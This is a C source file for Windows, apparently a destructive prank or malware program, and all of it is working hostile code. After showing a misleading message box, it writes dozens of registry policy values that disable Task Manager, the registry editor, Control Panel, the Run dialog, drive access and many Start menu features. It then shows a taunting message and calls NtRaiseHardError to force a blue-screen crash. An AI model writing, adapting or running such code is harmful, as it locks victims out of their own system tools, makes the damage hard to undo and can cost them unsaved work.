#include <windows.h>
#include <WinUser.h>
void disable() {
    HKEY hKey;
    LONG reg;
    DWORD cbData = 1;
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"{20D04FE0-3AEA-1069-A2D8-08002B30309D}", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuPinnedList ", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuMFUprogramsList ", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoUserNameInStartMenu", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoNetworkConnections", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuNetworkPlaces", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"StartmenuLogoff", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuSubFolders", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoCommonGroups", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoFavoritesMenu", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoRecentDocsMenu", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoSetFolders", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoAddPrinter", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoFind", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoSMHelp", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoRun", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuMorePrograms", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoClose", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoChangeStartMenu", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoSMMyDocs", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoSMMyPictures", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoStartMenuMyMusic", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoControlPanel", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoDrives", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"NoViewOnDrive", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &hKey, 0);
    reg = RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&cbData, sizeof(cbData));
    RegCloseKey(hKey);
}
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);
void bsod() {
    ULONG r = NULL;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
    NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
}
int __stdcall WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    MessageBoxW(0, L"Restart for saving. Registry успешно отвален if you will press yes :D", L"Отвалено.... если.. да?", MB_SYSTEMMODAL | MB_ICONWARNING);
    disable();
    MessageBoxW(0, L"t e r r i b l e  d e c i s i o n .", L"t e r r i b l e  d e c i s i o n .", MB_SYSTEMMODAL | MB_ICONWARNING);
    bsod();
}